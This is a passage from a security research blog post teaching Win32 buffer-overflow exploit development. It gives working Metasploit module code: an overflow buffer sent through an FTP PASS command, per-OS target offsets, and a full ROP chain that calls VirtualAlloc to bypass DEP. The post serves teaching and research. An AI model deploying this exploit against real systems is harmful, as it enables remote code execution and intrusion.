    buffer = A * target&#91;'ShellCode_OffSet'] # Padding
    buffer &lt;&lt; move_esp
    buffer &lt;&lt; payload.encoded
    buffer &lt;&lt; B * (target&#91;'OffSet']-buffer.length) # This fills the buffer till EIP
    buffer &lt;&lt; &#91;target.ret].pack('V') # EIP
    buffer &lt;&lt; create_rop_chain()
    buffer &lt;&lt; jmp_back
    buffer &lt;&lt; C * (size-buffer.length) # Padding to buffer size

    request = PASS +buffer+\r\n
    connect()
    sock.get
    sock.put(USER username \r\n)
    sock.get
    print_status(Sending evil buffer...)
    sock.put(request)
    handler()
    disconnect()
  end
end</code></pre>



<p>Once everything is changed in the exploit file, just reload the module and execute again:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7778" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/40/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?fit=976%2C368&amp;ssl=1" data-orig-size="976,368" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="40" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?fit=300%2C113&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?fit=976%2C368&amp;ssl=1" loading="lazy" width="976" height="368" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=976%2C368&#038;ssl=1" alt class="wp-image-7778 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?w=976&amp;ssl=1 976w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=300%2C113&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=768%2C290&amp;ssl=1 768w" data-lazy-sizes="(max-width: 976px) 100vw, 976px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=976%2C368&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7778" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/40/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?fit=976%2C368&amp;ssl=1" data-orig-size="976,368" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="40" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?fit=300%2C113&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?fit=976%2C368&amp;ssl=1" loading="lazy" width="976" height="368" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=976%2C368&#038;ssl=1" alt="" class="wp-image-7778" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?w=976&amp;ssl=1 976w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=300%2C113&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/40.png?resize=768%2C290&amp;ssl=1 768w" sizes="(max-width: 976px) 100vw, 976px" data-recalc-dims="1" /></noscript></figure>



<p>PWNED!!!! Once more!</p>



<h2>Making it work with more Windows flavors</h2>



<p>From ropfunc_offset.txt on Windows XP SP3 English:</p>



<pre class="wp-block-code"><code>0x5f49a1cc : kernel32!multibytetowidechar (0x7c809c98), offset to kernel32.dll.virtualalloc (0x7c809af1) : -423 (-0x00001a7)</code></pre>



<p>We just need to make the exploit change the distance to VirtualAlloc on a target basis and the exploit should work.</p>



<p>For that, let’s define the distance in the target block for each operating system, and modify the create_rop_chain function to use this value.</p>



<p>Here is the Targets section modified:</p>



<pre class="wp-block-code"><code>'Targets'       =&gt;
        &#91;
          &#91;'Windows 7 SP1 64bit Spanish',
            {
              'Ret' =&gt; 0x5f4011f2, #0x5f4011f2 : # RET                      &#91;SLMFC.DLL]
              'OffSet' =&gt; 4654,
              'ShellCode_OffSet' =&gt; 4092,
              'VAlloc_OffSet' =&gt; 0xffffff28,       # Offset to VirtualAlloc -0xd8
            }
          ],
          &#91;'Windows XP SP3 English',
            {
              'Ret' =&gt; 0x5f4011f2, #0x5f4011f2 : # RET          &#91;SLMFC.DLL]
              'OffSet' =&gt; 4654,
              'ShellCode_OffSet' =&gt; 4092,
              'VAlloc_OffSet' =&gt; 0xfffffe59,  # Offset to VirtualAlloc -0x1a7
            }
          ]
        ],</code></pre>



<p>And here are the modifications to the rop chain:</p>



<pre class="wp-block-code"><code>def create_rop_chain()

    # rop chain generated by Nacho Sorribas
    rop_gadgets = &#91;
      # Put a valid pointer on EAX
      0x5f48c086,   # MOV EAX,ECX # RETN
      #--- Save ESP into ECX
      0x5f42F7dc,  
      0x41414141,  # to pop esi
      0x5f4011f2,    # RET
      0x41414141,  # compensate retn 0x04
      # Ptr to VirtualAlloc on EAX
      0x5f418fac,     # POP EAX # RETN
      0x5f49a1cc,    # PTR to kernel32.dll
      0x5f488461,   # MOV EAX,DWORD PTR DS:&#91;EAX] # RETN 0x04
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x04
      0x5f445803,   # POP EDI # RETN
      target&#91;'VAlloc_OffSet'],                # Offset to VirtualAlloc
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      # Save the pointer to VirtualAlloc
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFEC0,  # Value to EAX (-0x140)
      0x5f465969,   # NEG EAX # RETN
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      # Save returnTo
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # lpAddress (Address where start the DEP disabled)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFDBE, # Value to EAX (-578 bytes (0x242))
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
      0x41414141,  # Filler to POP EDI
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # dwSize (0x1FF)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFE01,  # Value to EAX (-0x1FF)
      0x5f465969,   # NEG EAX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # flAllocationType (0x1000)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFF001,  # -0xFFF  (-0x1000 contains null bytes)
      0x5f465969,   # NEG EAX # RETN
      0x5f4235b6,   # INC EAX # RETN (0xFFF + 1 = 0x1000)
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4298a4,   # INC ECX # RETN
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # flProtect (0x40)
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFFC0,  # -0x40 
      0x5f465969,   # NEG EAX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f4298a4,   # INC ECX # RETN
      0x5f440377,   # MOV DWORD PTR DS:&#91;ECX],EAX # RETN 0x08
      0x5f4011f2,    # RET
      0x41414141,  # Compensate for the Retn 0x08
      0x41414141,  # Compensate for the Retn 0x08
      # Make ESP point to VirtualAlloc pointer on stack and RET
      0x5f418fac,     # POP EAX # RETN
      0xFFFFFFEC,  # -0x14 (value to substract to ECX)
      0x5f425151,   # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
      0x5f46e759,   # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (eax -&gt; ptr to VirtualAlloc)
      0x41414141,  # Filler to POP EDI
      0x5f452c0f,    # XCHG EAX,ESP # RETN
    ].flatten.pack(V*)

    return rop_gadgets

  end</code></pre>



<p>And here is the configuration and execution against Windows XP.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7779" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/41/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?fit=970%2C524&amp;ssl=1" data-orig-size="970,524" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="41" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?fit=300%2C162&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?fit=970%2C524&amp;ssl=1" loading="lazy" width="970" height="524" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=970%2C524&#038;ssl=1" alt class="wp-image-7779 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?w=970&amp;ssl=1 970w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=300%2C162&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=768%2C415&amp;ssl=1 768w" data-lazy-sizes="(max-width: 970px) 100vw, 970px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=970%2C524&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7779" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/41/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?fit=970%2C524&amp;ssl=1" data-orig-size="970,524" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="41" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?fit=300%2C162&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?fit=970%2C524&amp;ssl=1" loading="lazy" width="970" height="524" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=970%2C524&#038;ssl=1" alt="" class="wp-image-7779" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?w=970&amp;ssl=1 970w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=300%2C162&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/41.png?resize=768%2C415&amp;ssl=1 768w" sizes="(max-width: 970px) 100vw, 970px" data-recalc-dims="1" /></noscript></figure>



<p>PWNED!!!! For the last time?</p>



<p>We can adapt the exploit to other win32 systems by just looking for the offset between “multibytetowidechar” and “virtualalloc” on kernel32.dll module.</p>



<h2>Conclusions</h2>



<p>Writing exploits for buffer overflow vulnerabilities on win32 is not an easy journey, but if you are reading this now, I guess you find it easier now than at the beginning.</p>



<p>The idea of this post was to help people starting in the exploit development world to get the concepts and the ideas quickly, and to make the learning curve less steep. Of course any software, library, or exploit will have its own complexity. Some of the tips in this post may help, but in other scenarios the exploiter will need to figure out how to solve some problems we have not covered here.<br><br>Written by Nacho Sorribas<br>First published on 23/06/16</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-4356" class="share-twitter sd-button share-icon" href="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-4356" class="share-linkedin sd-button share-icon" href="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-4356" class="share-facebook sd-button share-icon" href="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-168079201-4356-60581b7f93eb7' data-src='https://widgets.wp.com/likes/#blog_id=168079201&amp;post_id=4356&amp;origin=research.nccgroup.com&amp;obj_id=168079201-4356-60581b7f93eb7' data-name='like-post-frame-168079201-4356-60581b7f93eb7'><h3 class="sd-title">Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>	</div><!-- .entry-content -->

	<div class="entry-footer">
			</div><!-- .entry-footer -->

	<div class="entry-author-wrapper">
			<div class="entry-author">
		<div class="author-avatar">
			<img alt src="https://secure.gravatar.com/avatar/2b30d26ead12ef30f82748f8fc3064ba?s=80&#038;d=identicon&#038;r=g" class="avatar avatar-80 photo jetpack-lazy-image" height="80" width="80" loading="lazy" data-lazy-srcset="https://secure.gravatar.com/avatar/2b30d26ead12ef30f82748f8fc3064ba?s=160&#038;d=identicon&#038;r=g 2x" data-lazy-src="https://secure.gravatar.com/avatar/2b30d26ead12ef30f82748f8fc3064ba?s=80&amp;is-pending-load=1#038;d=identicon&#038;r=g" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img alt='' src='https://secure.gravatar.com/avatar/2b30d26ead12ef30f82748f8fc3064ba?s=80&#038;d=identicon&#038;r=g' srcset='https://secure.gravatar.com/avatar/2b30d26ead12ef30f82748f8fc3064ba?s=160&#038;d=identicon&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' loading='lazy'/></noscript>		</div><!-- .author-avatar -->

		<div class="author-heading">
			<h2 class="author-title">Published by <span class="author-name">Matt Lewis</span></h2>
		</div><!-- .author-heading -->

		<p class="author-bio">
						<a class="author-link" href="https://research.nccgroup.com/author/m4ttlewis/" rel="author">
				View all posts by Matt Lewis			</a>
		</p><!-- .author-bio -->
	</div><!-- .entry-auhtor -->
			<div class="site-posted-on">
			<strong>Published</strong>
			<time class="entry-date published" datetime="2016-06-23T13:37:00+00:00">June 23, 2016</time><time class="updated" datetime="2020-12-16T10:00:50+00:00">December 16, 2020</time>		</div><!-- .site-posted-on -->
	</div>
</article><!-- #post-## -->

			
	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://research.nccgroup.com/2016/06/16/sakula-an-adventure-in-dll-planting/" rel="prev"><span class="meta-nav screen-reader-text">Previous Post</span> Sakula: an adventure in DLL planting</a></div><div class="nav-next"><a href="https://research.nccgroup.com/2016/07/05/ransomware-how-vulnerable-is-your-system/" rel="next"><span class="meta-nav screen-reader-text">Next Post</span> Ransomware: How vulnerable is your system?</a></div></div>
	</nav>
			
		
		</main><!-- #main -->
	</div><!-- #primary -->

		</div><!-- #content -->

		<footer id="colophon" class="site-footer" role="contentinfo">
						<div class="site-info">
				<a></a>
				
							</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #content-wrapper -->
</div><!-- #page -->

<!--  -->
<script defer id='bilmur' data-provider='wordpress.com' data-service='atomic' src='https://s0.wp.com/wp-content/js/bilmur.min.js?m=202112'></script>
	<div style="display:none">
	<div class="grofile-hash-map-2b30d26ead12ef30f82748f8fc3064ba">
	</div>
	</div>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/research.nccgroup.com\/2016\/06\/23\/writing-exploits-for-win32-systems-from-scratch\/":4356};
	</script>
				<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/_inc/build/photon/photon.min.js' id='jetpack-photon-js'></script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/plugins/coblocks/dist/js/coblocks-animation.js?ver=2.9.0' id='coblocks-animation-js'></script>
<script type='text/javascript' id='coblocks-lightbox-js-extra'>
/* <![CDATA[ */
var coblocksLigthboxData = {"closeLabel":"Close Gallery","leftLabel":"Previous","rightLabel":"Next"};
/* ]]> */
</script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/plugins/coblocks/dist/js/coblocks-lightbox.js?ver=2.9.0' id='coblocks-lightbox-js'></script>
<script type='text/javascript' src='https://secure.gravatar.com/js/gprofiles.js?ver=202112' id='grofiles-cards-js'></script>
<script type='text/javascript' id='wpgroho-js-extra'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/modules/wpgroho.js' id='wpgroho-js'></script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/js/navigation.js?ver=20170317' id='independent-publisher-2-navigation-js'></script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/js/independent-publisher-2.js?ver=20210118' id='independent-publisher-2-images-js'></script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/js/skip-link-focus-fix.js?ver=20170315' id='independent-publisher-2-skip-link-focus-fix-js'></script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/inc/script-wpcom.js?ver=20210111' id='independent-publisher-2-wpcom-functions-js'></script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/plugins/jetpack/vendor/automattic/jetpack-lazy-images/src/js/intersectionobserver-polyfill.min.js?ver=1.1.2' id='jetpack-lazy-images-polyfill-intersectionobserver-js'></script>
<script type='text/javascript' id='jetpack-lazy-images-js-extra'>
/* <![CDATA[ */
var jetpackLazyImagesL10n = {"loading_warning":"Images are still loading. Please cancel your print and try again."};
/* ]]> */
</script>
<script type='text/javascript' src='https://research.nccgroup.com/wp-content/plugins/jetpack/vendor/automattic/jetpack-lazy-images/src/js/lazy-images.min.js?ver=1.1.2' id='jetpack-lazy-images-js'></script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/_inc/build/postmessage.min.js' id='postmessage-js'></script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/_inc/build/jquery.jetpack-resize.min.js' id='jetpack_resize-js'></script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/_inc/build/likes/queuehandler.min.js' id='jetpack_likes_queuehandler-js'></script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7/wp-includes/js/wp-embed.min.js' id='wp-embed-js'></script>
<script type='text/javascript' id='jetpack-carousel-js-extra'>
/* <![CDATA[ */
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/research.nccgroup.com\/wp-admin\/admin-ajax.php","nonce":"f879019338","display_exif":"0","display_comments":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/research.nccgroup.com\/wp-login.php?redirect_to=https%3A%2F%2Fresearch.nccgroup.com%2F2016%2F06%2F23%2Fwriting-exploits-for-win32-systems-from-scratch%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"local_comments_commenting_as":"<fieldset><label for=\"email\">Email (Required)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Name (Required)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Website<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>"};
/* ]]> */
</script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/_inc/build/carousel/jetpack-carousel.min.js' id='jetpack-carousel-js'></script>
<script type='text/javascript' id='sharing-js-js-extra'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://c0.wp.com/p/jetpack/9.5.2/_inc/build/sharedaddy/sharing.min.js' id='sharing-js-js'></script>
<script type='text/javascript' id='sharing-js-js-after'>
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
</script>
	<iframe src='https://widgets.wp.com/likes/master.html?ver=202112#ver=202112' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars'><div class="likes-text"><span>%d</span> bloggers like this:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
	<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'168079201',post:'4356',tz:'0',srv:'research.nccgroup.com'} ]);
	_stq.push([ 'clickTrackerInit', '168079201', '4356' ]);
</script>
<svg style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<symbol id="icon-500px" viewBox="0 0 24 24">
<path d="M6.94026,15.1412c.00437.01213.108.29862.168.44064a6.55008,6.55008,0,1,0,6.03191-9.09557,6.68654,6.68654,0,0,0-2.58357.51467A8.53914,8.53914,0,0,0,8.21268,8.61344L8.209,8.61725V3.22948l9.0504-.00008c.32934-.0036.32934-.46353.32934-.61466s0-.61091-.33035-.61467L7.47248,2a.43.43,0,0,0-.43131.42692v7.58355c0,.24466.30476.42131.58793.4819.553.11812.68074-.05864.81617-.2457l.018-.02481A10.52673,10.52673,0,0,1,9.32258,9.258a5.35268,5.35268,0,1,1,7.58985,7.54976,5.417,5.417,0,0,1-3.80867,1.56365,5.17483,5.17483,0,0,1-2.69822-.74478l.00342-4.61111a2.79372,2.79372,0,0,1,.71372-1.78792,2.61611,2.61611,0,0,1,1.98282-.89477,2.75683,2.75683,0,0,1,1.95525.79477,2.66867,2.66867,0,0,1,.79656,1.909,2.724,2.724,0,0,1-2.75849,2.748,4.94651,4.94651,0,0,1-.86254-.13719c-.31234-.093-.44519.34058-.48892.48349-.16811.54966.08453.65862.13687.67489a3.75751,3.75751,0,0,0,1.25234.18375,3.94634,3.94634,0,1,0-2.82444-6.742,3.67478,3.67478,0,0,0-1.13028,2.584l-.00041.02323c-.0035.11667-.00579,2.881-.00644,3.78811l-.00407-.00451a6.18521,6.18521,0,0,1-1.0851-1.86092c-.10544-.27856-.34358-.22925-.66857-.12917-.14192.04372-.57386.17677-.47833.489Zm4.65165-1.08338a.51346.51346,0,0,0,.19513.31818l.02276.022a.52945.52945,0,0,0,.3517.18416.24242.24242,0,0,0,.16577-.0611c.05473-.05082.67382-.67812.73287-.738l.69041.68819a.28978.28978,0,0,0,